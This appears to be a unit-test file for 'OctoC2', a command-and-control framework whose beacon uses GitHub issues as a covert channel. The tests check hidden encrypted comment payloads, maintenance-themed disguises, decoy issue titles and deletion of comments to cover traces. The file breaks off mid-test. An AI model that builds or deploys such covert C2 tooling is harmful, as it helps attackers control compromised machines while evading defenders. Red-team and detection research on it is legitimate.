/**
 * OctoC2 — IssuesTentacle unit tests
 *
 * Covers: isAvailable(), ensureInitialized() flow, comment format
 * parsing, and the NONCE_RE handling for both beacon (<!-- - -->)
 * and operator (<!-- base64url_nonce -->) comment endings.
 *
 * The GitHub API (Octokit) is fully mocked — no network calls.
 */

import { describe, it, expect, beforeEach, afterEach, mock } from "bun:test";

// Set short poll timeouts BEFORE module import so the constants are read correctly.
// Without this, initialization tests wait 30s for a poll ACK that never arrives.
process.env["SVC_POLL_TIMEOUT_MS"] = "200";
process.env["SVC_POLL_RETRY_MS"]   = "50";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { rm, mkdir } from "node:fs/promises";

// ── Mock @octokit/rest before importing IssuesTentacle ────────────────────────
//
// Bun's mock.module replaces the module for all imports in this test file.
// We expose spy functions so individual tests can configure responses.

const mockRepoGet         = mock(() => Promise.resolve({ data: { full_name: "op/c2" } }));
const mockGetRepoVariable = mock(() =>
  Promise.resolve({ data: { value: "" } }) // set per-test
);
const mockListIssues      = mock(() => Promise.resolve({ data: [] }));
const mockCreateIssue     = mock(() => Promise.resolve({ data: { number: 42 } }));
const mockCreateComment   = mock(() => Promise.resolve({ data: { id: 1001 } }));
const mockListComments    = mock(() => Promise.resolve({ data: [] }));
const mockDeleteComment   = mock(() => Promise.resolve({}));
const mockUpdateComment   = mock(() => Promise.resolve({ data: {} }));
const mockPaginate        = mock((_fn: unknown, params: unknown) => {
  void params;
  return Promise.resolve([]);
});

const mockHookWrap = mock((_name: string, _fn: Function) => {});

mock.module("@octokit/rest", () => ({
  Octokit: class MockOctokit {
    hook = { wrap: mockHookWrap };
    rest = {
      repos:   { get: mockRepoGet },
      actions: { getRepoVariable: mockGetRepoVariable },
      issues: {
        listForRepo:    mockListIssues,
        create:         mockCreateIssue,
        createComment:  mockCreateComment,
        updateComment:  mockUpdateComment,
        listComments:   mockListComments,
        deleteComment:  mockDeleteComment,
      },
    };
    paginate = mockPaginate;
  },
}));

// Import AFTER mock is registered
const { IssuesTentacle } = await import("../tentacles/IssuesTentacle.ts");
const { generateKeyPair, publicKeyToBase64 } = await import("../crypto/sodium.ts");

// ── Helpers ───────────────────────────────────────────────────────────────────

let testDir: string;
let originalXdg: string | undefined;

function makeTentacle(tokenOverride = "ghp_test_token") {
  const config = {
    id:   "550e8400-e29b-41d4-a716-446655440001",
    repo: { owner: "op", name: "c2" },
    token: tokenOverride,
    tentaclePriority: ["issues"] as import("../types.ts").TentacleKind[],
    sleepSeconds: 60,
    jitter: 0.2,
    operatorPublicKey: new Uint8Array(32),
    beaconKeyPair: {
      publicKey: new Uint8Array(32),
      secretKey: new Uint8Array(32),
    },
  };
  return new IssuesTentacle(config);
}

async function makeOperatorKeyPair() {
  const kp  = await generateKeyPair();
  const b64 = await publicKeyToBase64(kp.publicKey);
  return { kp, b64 };
}

beforeEach(async () => {
  testDir     = join(tmpdir(), `svc-tentacle-test-${crypto.randomUUID()}`);
  originalXdg = process.env["XDG_CONFIG_HOME"];
  process.env["XDG_CONFIG_HOME"] = testDir;
  await mkdir(join(testDir, "svc"), { recursive: true });

  // Reset all mocks to clean state (mockReset clears both call history AND implementation)
  mockRepoGet.mockReset();
  mockGetRepoVariable.mockReset();
  mockListIssues.mockReset();
  mockCreateIssue.mockReset();
  mockCreateComment.mockReset();
  mockListComments.mockReset();
  mockDeleteComment.mockReset();
  mockPaginate.mockReset();

  // Restore defaults after reset
  mockRepoGet.mockResolvedValue({ data: { full_name: "op/c2" } });
  mockGetRepoVariable.mockResolvedValue({ data: { value: "" } });
  mockListIssues.mockResolvedValue({ data: [] });
  mockCreateIssue.mockResolvedValue({ data: { number: 42 } });
  mockCreateComment.mockResolvedValue({ data: { id: 1001 } });
  mockListComments.mockResolvedValue({ data: [] });
  mockDeleteComment.mockResolvedValue({});
  mockUpdateComment.mockReset();
  mockUpdateComment.mockResolvedValue({ data: {} });
  mockPaginate.mockImplementation(() => Promise.resolve([]));
});

afterEach(async () => {
  if (originalXdg !== undefined) {
    process.env["XDG_CONFIG_HOME"] = originalXdg;
  } else {
    delete process.env["XDG_CONFIG_HOME"];
  }
  await rm(testDir, { recursive: true, force: true });
});

// ── isAvailable ───────────────────────────────────────────────────────────────

describe("isAvailable()", () => {
  it("returns true when repo GET and variable GET both succeed", async () => {
    mockRepoGet.mockResolvedValueOnce({ data: { full_name: "op/c2" } });
    mockGetRepoVariable.mockResolvedValueOnce({ data: { value: "abc123" } });

    const tentacle = makeTentacle();
    expect(await tentacle.isAvailable()).toBe(true);
    expect(mockRepoGet).toHaveBeenCalledTimes(1);
    expect(mockGetRepoVariable).toHaveBeenCalledTimes(1);
  });

  it("returns false when repo GET fails (e.g. bad PAT)", async () => {
    mockRepoGet.mockRejectedValueOnce(new Error("401 Unauthorized"));

    const tentacle = makeTentacle();
    expect(await tentacle.isAvailable()).toBe(false);
  });

  it("returns false when operator pubkey variable is missing (404)", async () => {
    mockRepoGet.mockResolvedValueOnce({ data: { full_name: "op/c2" } });
    mockGetRepoVariable.mockRejectedValueOnce(new Error("404 Not Found"));

    const tentacle = makeTentacle();
    expect(await tentacle.isAvailable()).toBe(false);
  });

  it("does NOT call ensureInitialized (no issue search or comment API calls)", async () => {
    mockRepoGet.mockResolvedValueOnce({ data: { full_name: "op/c2" } });
    mockGetRepoVariable.mockResolvedValueOnce({ data: { value: "abc" } });

    const tentacle = makeTentacle();
    await tentacle.isAvailable();

    expect(mockPaginate).not.toHaveBeenCalled();
    expect(mockCreateIssue).not.toHaveBeenCalled();
    expect(mockCreateComment).not.toHaveBeenCalled();
  });
});

// ── ensureInitialized (via checkin) ──────────────────────────────────────────

describe("initialization flow", () => {
  it("fetches operator pubkey during initialization", async () => {
    const { kp, b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);           // no existing issues
    mockCreateIssue.mockResolvedValue({ data: { number: 42 } });
    mockCreateComment.mockResolvedValue({ data: { id: 1001 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = makeTentacle();

    const payload = {
      beaconId: "test-id",
      publicKey: "",
      hostname:  "test-host",
      username:  "user",
      os:        "linux",
      arch:      "x64",
      pid:       999,
      checkinAt: new Date().toISOString(),
    };

    await tentacle.checkin(payload);

    // getRepoVariable should have been called to fetch the operator pubkey
    expect(mockGetRepoVariable).toHaveBeenCalledWith(
      expect.objectContaining({ name: "MONITORING_PUBKEY" })
    );
  });

  it("creates a beacon issue when none exists", async () => {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);           // no existing issues found
    mockCreateIssue.mockResolvedValue({ data: { number: 55 } });
    mockCreateComment.mockResolvedValue({ data: { id: 2001 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };

    await tentacle.checkin(payload);

    expect(mockCreateIssue).toHaveBeenCalledTimes(1);
    // No opsec-identifiable label; title uses short beacon ID, not "OctoC2"
    const call = (mockCreateIssue.mock.calls[0] as unknown as [{ title: string; labels?: string[] }])[0];
    expect(call.title).toMatch(/Scheduled maintenance/);
    expect(call.labels ?? []).not.toContain("infra-node");
  });

  it("reuses an existing issue matching the beacon ID in the body", async () => {
    const { b64 } = await makeOperatorKeyPair();
    const beaconId = "550e8400-e29b-41d4-a716-446655440001";

    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    // paginate returns an issue whose body contains the beacon ID marker
    mockPaginate.mockResolvedValue([
      { number: 77, body: `<!-- node:${beaconId} -->\n\nAutomated health tracking.` } as never,
    ]);
    mockCreateComment.mockResolvedValue({ data: { id: 3001 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = makeTentacle();
    const payload  = {
      beaconId, publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };

    await tentacle.checkin(payload);

    // Should NOT create a new issue
    expect(mockCreateIssue).not.toHaveBeenCalled();
    // Should post to issue #77
    expect(mockCreateComment).toHaveBeenCalledWith(
      expect.objectContaining({ issue_number: 77 })
    );
  });

  it("surfaces a fatal error when operator pubkey variable is empty", async () => {
    mockGetRepoVariable.mockResolvedValue({ data: { value: "" } }); // empty!

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "x", publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };

    await expect(tentacle.checkin(payload)).rejects.toThrow("MONITORING_PUBKEY");
  });
});

// ── Comment format: NONCE_RE handling ─────────────────────────────────────────

describe("comment format parsing", () => {
  // Access the private parseComment via a module-level re-export shim or
  // test it indirectly through the comment regex patterns.
  // We test the regex directly here since it's the core of comment parsing.

  // These mirror IssuesTentacle.ts's production regexes
  const HEARTBEAT_RE  = /<!--\s*job:(\d+):(reg|ci|logs|deploy):([^\s>]+)\s*-->/m;
  // Beacon comments embed ciphertext on a plain line after <!-- infra-diagnostic:epoch -->
  const CIPHERTEXT_RE = /<!--\s*infra-diagnostic:[^\s>]+\s*-->\n([A-Za-z0-9_\-+/=]+)/;
  // Deploy comments (server→beacon) still use ```text blocks — beacon uses this regex to parse them
  const DEPLOY_CT_RE  = /```text\n([A-Za-z0-9_\-+/=]+)\n```/;
  const NONCE_RE = /<!--\s+(-|[A-Za-z0-9_-]{4,})\s+-->/;

  it("HEARTBEAT_RE matches beacon ci comment first line", () => {
    const body = "<!-- job:1748956800:ci:0042 -->\n<!-- infra-diagnostic:1748956800 -->";
    const m = HEARTBEAT_RE.exec(body);
    expect(m).not.toBeNull();
    expect(m![2]).toBe("ci");
    expect(m![3]).toBe("0042");
  });

  it("HEARTBEAT_RE matches operator deploy comment first line", () => {
    const body = "<!-- job:1748956801:deploy:maint-a3f9 -->\n### 📌 Maintenance Task";
    const m = HEARTBEAT_RE.exec(body);
    expect(m).not.toBeNull();
    expect(m![2]).toBe("deploy");
    expect(m![3]).toBe("maint-a3f9");
  });

  it("HEARTBEAT_RE matches reg comment", () => {
    const body = "<!-- job:1748956800:reg:0001 -->";
    const m = HEARTBEAT_RE.exec(body);
    expect(m).not.toBeNull();
    expect(m![2]).toBe("reg");
  });

  it("NONCE_RE matches beacon placeholder <!-- - -->", () => {
    const body = "some content\n<!-- - -->";
    const m = NONCE_RE.exec(body);
    expect(m).not.toBeNull();
    expect(m![1]).toBe("-");
  });

  it("NONCE_RE matches operator nonce <!-- SGVsbG8gV29ybGQ -->", () => {
    const nonce = "SGVsbG8tV29ybGQ";          // URL-safe base64, no padding
    const body  = `some content\n<!-- ${nonce} -->`;
    const m = NONCE_RE.exec(body);
    expect(m).not.toBeNull();
    expect(m![1]).toBe(nonce);
  });

  it("NONCE_RE does not match <!-- --> (empty comment)", () => {
    const body = "content\n<!---->";
    const m = NONCE_RE.exec(body);
    expect(m).toBeNull();
  });

  it("CIPHERTEXT_RE extracts payload from hidden infra-diagnostic marker (beacon format)", () => {
    const ct   = "eyJub25jZSI6IjEyMyIsImNpcGhlcnRleHQiOiJhYmMifQ";
    const body = `<!-- infra-diagnostic:1748956800 -->\n${ct}\n<!-- - -->`;
    const m    = CIPHERTEXT_RE.exec(body);
    expect(m).not.toBeNull();
    expect(m![1]).toBe(ct);
  });

  it("DEPLOY_CT_RE extracts payload from details block (server deploy format)", () => {
    const ct   = "eyJub25jZSI6IjEyMyIsImNpcGhlcnRleHQiOiJhYmMifQ";
    const body = `<details>\n\`\`\`text\n${ct}\n\`\`\`\n</details>`;
    const m    = DEPLOY_CT_RE.exec(body);
    expect(m).not.toBeNull();
    expect(m![1]).toBe(ct);
  });

  it("full beacon comment parses all three regex fields", () => {
    const ct   = "eyJiZWFjb25JZCI6InRlc3QifQ";
    const body = [
      "<!-- job:1748956800:ci:0007 -->",
      "<!-- infra-diagnostic:1748956800 -->",
      ct,
      "<!-- - -->",
    ].join("\n");

    expect(HEARTBEAT_RE.exec(body)![2]).toBe("ci");
    expect(CIPHERTEXT_RE.exec(body)![1]).toBe(ct);
    expect(NONCE_RE.exec(body)![1]).toBe("-");
  });

  it("full operator task comment parses all three regex fields", () => {
    const ct    = "dGFza3BheWxvYWQ";
    const nonce = "bm9uY2VkYXRhMTIz";
    const body  = [
      "<!-- job:1748956801:deploy:maint-a3f9 -->",
      "",
      "### 📌 Maintenance Task · Ref `maint-a3f9`",
      "",
      "Automated maintenance task queued for execution.",
      "",
      "<details>",
      "<summary>Operation parameters</summary>",
      "",
      "```text",
      ct,
      "```",
      "",
      "</details>",
      `<!-- ${nonce} -->`,
    ].join("\n");

    expect(HEARTBEAT_RE.exec(body)![2]).toBe("deploy");
    // Deploy comments (server→beacon) use the ```text block format; beacon parses them with DEPLOY_CT_RE
    expect(DEPLOY_CT_RE.exec(body)![1]).toBe(ct);
    expect(NONCE_RE.exec(body)![1]).toBe(nonce);
  });
});

// ── pruneOldComments ──────────────────────────────────────────────────────────

describe("pruneOldComments", () => {
  it("prunes nothing when no old non-maintenance comments exist", async () => {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);
    mockCreateComment.mockResolvedValue({ data: { id: 9001 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };
    await tentacle.checkin(payload);

    // register() deletes the reg comment (OPSEC cleanup) — 1 deletion.
    // pruneOldComments finds no old non-maintenance comments — no additional deletions.
    expect(mockDeleteComment).toHaveBeenCalledTimes(1);
    const deletedId = (mockDeleteComment.mock.calls[0] as unknown as [{ comment_id: number }])[0].comment_id;
    expect(deletedId).toBe(9001); // the registration comment
  });

  it("prunes ci comments after 120s but spares logs comments until 30 minutes", async () => {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);
    mockCreateComment.mockResolvedValue({ data: { id: 9002 } });

    // logs: 150s old — SPARED (logs cutoff is 30 min = 1800s)
    const oldLogsBody  = "<!-- job:1000000000:logs:0001 -->\n<!-- infra-diagnostic:1000000000 -->\nabc\n<!-- - -->";
    // logs: future-dated — SPARED
    const youngLogsBody = "<!-- job:9999999999:logs:0002 -->\n<!-- infra-diagnostic:9999999999 -->\nabc\n<!-- - -->";
    // ci: 150s old — PRUNED (ci cutoff is 120s)
    const oldCiBody    = "<!-- job:1000000000:ci:0003 -->\n<!-- infra-diagnostic:1000000000 -->\nabc\n<!-- - -->";

    // 150s old: older than ci 120s cutoff (deleted), but:
    //   - logs comment spared (150s < 1800s logs cutoff)
    //   - startupCleanup spares all (< 300s)
    mockListComments.mockResolvedValue({ data: [
      { id: 1, body: oldLogsBody,   created_at: new Date(Date.now() - 150000).toISOString() } as never,
      { id: 2, body: youngLogsBody, created_at: new Date(Date.now() + 60000).toISOString() } as never,
      { id: 3, body: oldCiBody,     created_at: new Date(Date.now() - 150000).toISOString() } as never,
    ]});

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };
    await tentacle.checkin(payload);

    // 2 deletions total:
    //   call[0] = reg comment (id 9002) deleted by register() OPSEC cleanup
    //   call[1] = old ci comment (id 3) pruned (150s > 120s ci cutoff)
    // id=1 (old logs) is SPARED — logs have 30-min cutoff (150s << 1800s)
    // id=2 (future-dated) is SPARED — not yet old
    // startupCleanup spares all (< 300s old)
    expect(mockDeleteComment).toHaveBeenCalledTimes(2);
    const deletedIds = (mockDeleteComment.mock.calls as unknown as [{ comment_id: number }][])
      .map(([args]) => args.comment_id);
    expect(deletedIds).toContain(3);    // old CI comment
    expect(deletedIds).toContain(9002); // registration comment
    expect(deletedIds).not.toContain(1); // old logs comment — spared
  });

  it("prunes stale logs comments after 30 minutes", async () => {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);
    mockCreateComment.mockResolvedValue({ data: { id: 9004 } });

    // logs: 31 min old — PRUNED (> 30 min logs cutoff)
    const staleLogsBody = "<!-- job:1000000000:logs:0001 -->\n<!-- infra-diagnostic:1000000000 -->\nabc\n<!-- - -->";

    mockListComments.mockResolvedValue({ data: [
      { id: 7001, body: staleLogsBody, created_at: new Date(Date.now() - 31 * 60 * 1000).toISOString() } as never,
    ]});

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };
    await tentacle.checkin(payload);

    // 3 deletions: reg comment + stale logs comment (pruned by both startupCleanup and pruneOldComments)
    // Both startupCleanup (300s cutoff) and pruneOldComments (1800s cutoff) see the 31-min-old comment
    expect(mockDeleteComment).toHaveBeenCalledTimes(3);
    const deletedIds = (mockDeleteComment.mock.calls as unknown as [{ comment_id: number }][])
      .map(([args]) => args.comment_id);
    expect(deletedIds).toContain(7001); // stale logs pruned (> 30 min)
    expect(deletedIds).toContain(9004); // reg comment
  });

  it("spares maintenance comments regardless of age", async () => {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);
    mockCreateComment.mockResolvedValue({ data: { id: 9003 } });

    const maintBody = "<!-- infra-maintenance:test-session-id -->\n### 🛠️ Scheduled maintenance\n✅ Initial check-in\n";
    // 150s old: older than pruneOldComments 120s cutoff (would be pruned without marker),
    // but newer than startupCleanup 300s cutoff (spared by age there too).
    mockListComments.mockResolvedValue({ data: [
      { id: 5001, body: maintBody, created_at: new Date(Date.now() - 150000).toISOString() } as never,
    ]});

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };
    await tentacle.checkin(payload);

    // register() deletes the reg comment (id=9003) — 1 deletion.
    // pruneOldComments must NOT delete the maintenance comment (has infra-maintenance marker).
    // startupCleanup spares it too (< 300s old).
    expect(mockDeleteComment).toHaveBeenCalledTimes(1);
    const deletedId = (mockDeleteComment.mock.calls[0] as unknown as [{ comment_id: number }])[0].comment_id;
    expect(deletedId).toBe(9003); // only the registration comment was deleted
  });
});

// ── upsertMaintenanceComment ──────────────────────────────────────────────────

describe("upsertMaintenanceComment", () => {
  async function makeInitializedTentacle() {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);
    mockCreateIssue.mockResolvedValue({ data: { number: 42 } });
    mockCreateComment.mockResolvedValue({ data: { id: 5001 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "beacon-host", username: "u",
      os: "linux", arch: "x64", pid: 12345, checkinAt: new Date().toISOString(),
    };
    await tentacle.checkin(payload);
    return { tentacle, payload };
  }

  it("creates a maintenance comment on the first checkin", async () => {
    await makeInitializedTentacle();
    const bodies: string[] = (mockCreateComment.mock.calls as unknown as [{ body: string }][])
      .map(([args]) => args.body ?? "");
    const hasMaintenanceComment = bodies.some((b) =>
      b.includes("<!-- infra-maintenance:")
    );
    expect(hasMaintenanceComment).toBe(true);
  });

  it("does NOT create a second maintenance comment on immediate re-checkin (rate limited)", async () => {
    const { tentacle, payload } = await makeInitializedTentacle();

    const callsBefore = (mockCreateComment.mock.calls as unknown[]).length;

    mockListComments.mockResolvedValue({ data: [] });
    await tentacle.checkin(payload);

    const callsAfter = (mockCreateComment.mock.calls as unknown[]).length;
    expect(callsAfter).toBe(callsBefore);
  });

  it("updates the existing maintenance comment in-place on subsequent calls", async () => {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);
    mockCreateComment.mockResolvedValue({ data: { id: 5002 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "beacon-host", username: "u",
      os: "linux", arch: "x64", pid: 12345, checkinAt: new Date().toISOString(),
    };

    await tentacle.checkin(payload);

    (tentacle as unknown as { nextMaintenanceUpdateMs: number }).nextMaintenanceUpdateMs = 0;

    mockListComments.mockResolvedValue({ data: [] });
    await tentacle.checkin(payload);

    expect(mockUpdateComment).toHaveBeenCalledWith(
      expect.objectContaining({
        comment_id: expect.any(Number),
        body: expect.stringContaining("<!-- infra-maintenance:"),
      })
    );
  });

  it("recovers gracefully when the maintenance comment has been deleted (404)", async () => {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);
    mockCreateComment.mockResolvedValue({ data: { id: 5003 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "beacon-host", username: "u",
      os: "linux", arch: "x64", pid: 12345, checkinAt: new Date().toISOString(),
    };

    await tentacle.checkin(payload);

    (tentacle as unknown as { nextMaintenanceUpdateMs: number }).nextMaintenanceUpdateMs = 0;

    const notFoundErr = Object.assign(new Error("Not Found"), { status: 404 });
    mockUpdateComment.mockRejectedValueOnce(notFoundErr);
    mockCreateComment.mockResolvedValue({ data: { id: 5999 } });
    mockListComments.mockResolvedValue({ data: [] });

    // NOTE: Bun 1.3.x has a bug where `.resolves.not.toThrow()` always fails
    // on non-function resolved values. Use `.resolves.toEqual` as equivalent.
    await expect(tentacle.checkin(payload)).resolves.toEqual(expect.anything());
    expect(mockCreateComment).toHaveBeenLastCalledWith(
      expect.objectContaining({ body: expect.stringContaining("<!-- infra-maintenance:") })
    );
  });

  it("maintenance comment body contains ✅ Initial check-in and no reg-ack task row after registration", async () => {
    await makeInitializedTentacle();

    const bodies: string[] = (mockCreateComment.mock.calls as unknown as [{ body: string }][])
      .map(([args]) => args.body ?? "");
    const maintenanceBody = bodies.find((b) =>
      b.includes("<!-- infra-maintenance:")
    );
    expect(maintenanceBody).toBeDefined();
    expect(maintenanceBody).toContain("✅ Initial check-in");
    expect(maintenanceBody).not.toContain("**reg-ack**");
  });

  it("issue title is used exactly as-is from SVC_ISSUE_TITLE with no suffix appended", async () => {
    process.env.SVC_ISSUE_TITLE = "Fix: resolve null pointer in config loader";
    try {
      const { b64 } = await makeOperatorKeyPair();
      mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
      mockPaginate.mockResolvedValue([]);
      mockCreateIssue.mockResolvedValue({ data: { number: 42 } });
      mockCreateComment.mockResolvedValue({ data: { id: 1001 } });
      mockListComments.mockResolvedValue({ data: [] });

      const tentacle = makeTentacle();
      const payload  = { beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
                         os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString() };
      await tentacle.checkin(payload);

      const call = (mockCreateIssue.mock.calls[0] as unknown as [{ title: string }])[0];
      expect(call.title).toBe("Fix: resolve null pointer in config loader");
      // Must not have any suffix added
      expect(call.title).not.toMatch(/#[0-9a-f]{6,}/);
    } finally {
      delete process.env.SVC_ISSUE_TITLE;
    }
  });

  it("maintenance comment header is exactly '🛠️ Scheduled maintenance'", async () => {
    await makeInitializedTentacle();
    const bodies: string[] = (mockCreateComment.mock.calls as unknown as [{ body: string }][])
      .map(([args]) => args.body ?? "");
    const maintenanceBody = bodies.find((b) => b.includes("<!-- infra-maintenance:"));
    expect(maintenanceBody).toBeDefined();
    expect(maintenanceBody).toContain("### 🛠️ Scheduled maintenance");
    expect(maintenanceBody).not.toContain("Maintenance Session ·");
    expect(maintenanceBody).not.toContain("beacon-host");
  });

  it("startupCleanup deletes stale maintenance comment while preserving current session", async () => {
    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);
    mockCreateIssue.mockResolvedValue({ data: { number: 42 } });
    mockCreateComment.mockResolvedValue({ data: { id: 6001 } });
    mockListComments.mockResolvedValue({ data: [] });

    // First tentacle: simulate normal first run (creates state + maintenance comment)
    const tentacle1 = makeTentacle();
    const payload   = { beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
                        os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString() };
    await tentacle1.checkin(payload);

    // Grab the maintenanceSessionId written to disk by the first run
    const state1 = (tentacle1 as unknown as { state: { maintenanceSessionId: string } }).state;
    const currentSessionId = state1.maintenanceSessionId;
    expect(currentSessionId).toBeTruthy();

    // Simulate a restart: create a second tentacle (same config, same XDG dir).
    // It will load state from disk (issueNumber=42, registrationStatus="registered"),
    // skip registration, and run startupCleanup during _initialize().
    const staleCommentId   = 7777;
    const currentCommentId = 6001;
    const oldCutoff = new Date(Date.now() - 360_000).toISOString(); // 6 min ago (> 300s startupCleanup cutoff)

    mockDeleteComment.mockReset();
    // startupCleanup calls listComments — return one stale + one current session comment
    mockListComments.mockResolvedValue({
      data: [
        {
          id: staleCommentId,
          created_at: oldCutoff,
          body: `<!-- infra-maintenance:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee -->\n\n### 🛠️ Scheduled maintenance`,
        },
        {
          id: currentCommentId,
          created_at: oldCutoff,
          body: `<!-- infra-maintenance:${currentSessionId} -->\n\n### 🛠️ Scheduled maintenance`,
        },
      ],
    });

    const tentacle2 = makeTentacle();
    await tentacle2.checkin(payload);

    // Only the stale comment should have been deleted by startupCleanup
    const deletedIds = (mockDeleteComment.mock.calls as unknown as [{ comment_id: number }][])
      .map(([args]) => args.comment_id);
    expect(deletedIds).toContain(staleCommentId);
    expect(deletedIds).not.toContain(currentCommentId);
  });
});

// ── SVC_ISSUE_TITLE env var wiring ─────────────────────────────────────────

describe("discoverOrCreateIssue — SVC_ISSUE_TITLE", () => {
  it("uses SVC_ISSUE_TITLE env var as issue title when set", async () => {
    process.env["SVC_ISSUE_TITLE"] = "Fix flaky timeout in scheduler";
    try {
      const { b64 } = await makeOperatorKeyPair();
      mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
      mockPaginate.mockResolvedValue([]);   // no existing issues
      mockCreateIssue.mockResolvedValue({ data: { number: 42 } });
      mockCreateComment.mockResolvedValue({ data: { id: 1001 } });
      mockListComments.mockResolvedValue({ data: [] });

      const tentacle = makeTentacle();
      const payload  = {
        beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
        os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
      };

      await tentacle.checkin(payload);

      expect(mockCreateIssue).toHaveBeenCalledTimes(1);
      const call = (mockCreateIssue.mock.calls[0] as unknown as [{ title: string }])[0];
      expect(call.title).toBe("Fix flaky timeout in scheduler");
    } finally {
      delete process.env["SVC_ISSUE_TITLE"];
    }
  });

  it("falls back to stealthy title when SVC_ISSUE_TITLE is not set", async () => {
    delete process.env["SVC_ISSUE_TITLE"];

    const { b64 } = await makeOperatorKeyPair();
    mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
    mockPaginate.mockResolvedValue([]);   // no existing issues
    mockCreateIssue.mockResolvedValue({ data: { number: 42 } });
    mockCreateComment.mockResolvedValue({ data: { id: 1001 } });
    mockListComments.mockResolvedValue({ data: [] });

    const tentacle = makeTentacle();
    const payload  = {
      beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
      os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
    };

    await tentacle.checkin(payload);

    expect(mockCreateIssue).toHaveBeenCalledTimes(1);
    const call = (mockCreateIssue.mock.calls[0] as unknown as [{ title: string }])[0];
    // Default: "Scheduled maintenance · {shortId}"
    expect(call.title).toMatch(/^Scheduled maintenance ·/);
    // Must NOT contain the env-var title
    expect(call.title).not.toBe("Fix flaky timeout in scheduler");
  });

  it("stores the chosen issue title in BeaconState.issueTitle", async () => {
    process.env["SVC_ISSUE_TITLE"] = "Task: review config for abcd1234";
    try {
      const { b64 } = await makeOperatorKeyPair();
      mockGetRepoVariable.mockResolvedValue({ data: { value: b64 } });
      mockPaginate.mockResolvedValue([]);   // no existing issues → will create
      mockCreateIssue.mockResolvedValue({ data: { number: 99 } });
      mockCreateComment.mockResolvedValue({ data: { id: 2001 } });
      mockListComments.mockResolvedValue({ data: [] });

      const tentacle = makeTentacle();
      const payload  = {
        beaconId: "test-id", publicKey: "", hostname: "h", username: "u",
        os: "linux", arch: "x64", pid: 1, checkinAt: new Date().toISOString(),
      };

      await tentacle.checkin(payload);

      // Access the private state field to verify issueTitle was stored
      const state = (tentacle as unknown as { state: { issueTitle: string | null } }).state;
      expect(state.issueTitle).toBe("Task: review config for abcd1234");
    } finally {
      delete process.env["SVC_ISSUE_TITLE"];
    }
  });
});

// ── GitHub App auth integration ────────────────────────────────────────────────
//
// Verifies that IssuesTentacle (via BaseTentacle) correctly registers an
// Octokit request hook when GitHub App credentials are present, and falls
// back cleanly to PAT when they are absent.
//
// The mock Octokit above has `hook: { wrap: mockHookWrap }`, so these
// tests exercise the real BaseTentacle constructor logic through the full
// IssuesTentacle class hierarchy.

describe("IssuesTentacle — GitHub App auth", () => {
  const FAKE_PEM =
    "-----BEGIN RSA PRIVATE KEY-----\nMIIEoFake...\n-----END RSA PRIVATE KEY-----";

